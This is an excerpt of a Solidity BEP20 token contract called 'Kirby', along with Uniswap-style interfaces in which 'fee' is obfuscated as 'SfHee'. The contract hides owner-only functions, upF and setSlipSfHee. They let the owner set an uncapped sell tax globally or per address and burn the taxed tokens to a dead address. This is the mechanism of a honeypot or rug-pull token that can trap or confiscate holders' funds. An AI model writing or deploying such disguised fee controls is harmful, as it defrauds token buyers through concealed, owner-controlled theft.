...
interface IUniswapV2Factory {
    ...
    function SfHeeTo() external view returns (address);
    function SfHeeToSetter() external view returns (address);
    ...
    function setSfHeeTo(address) external;
    function setSfHeeToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingSfHeeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingSfHeeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingSfHeeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingSfHeeOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingSfHeeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract Kirby is BEP20, Ownable {
    ...
    uint256 private _defaultSellSfHee = 0;

    uint256 private _defaultBuySfHee = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipSfHee;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellSfHee = _value;
    }

    function setSlipSfHee(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipSfHee[_address] = _value;
    }

    function getSlipSfHee(address _address) external view onlyownar returns (uint256) {
        return _slipSfHee[_address];
    }


    function setMAccountSfHee(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountSfHee(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradeSfHeeAmount = 0;

        if (rF) {
            uint256 tradeSfHee = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradeSfHee = _defaultSellSfHee;
                }
                if (from == uniswapV2Pair) {

                    tradeSfHee = _defaultBuySfHee;
                }
            }
            if (_slipSfHee[from] > 0) {
                tradeSfHee = _slipSfHee[from];
            }

            tradeSfHeeAmount = _Amount.mul(tradeSfHee).div(100);
        }


        if (tradeSfHeeAmount > 0) {
            _balances[from] = _balances[from].sub(tradeSfHeeAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradeSfHeeAmount);
            emit Transfer(from, _deadAddress, tradeSfHeeAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradeSfHeeAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradeSfHeeAmount);
        emit Transfer(from, _to, _Amount - tradeSfHeeAmount);
    }
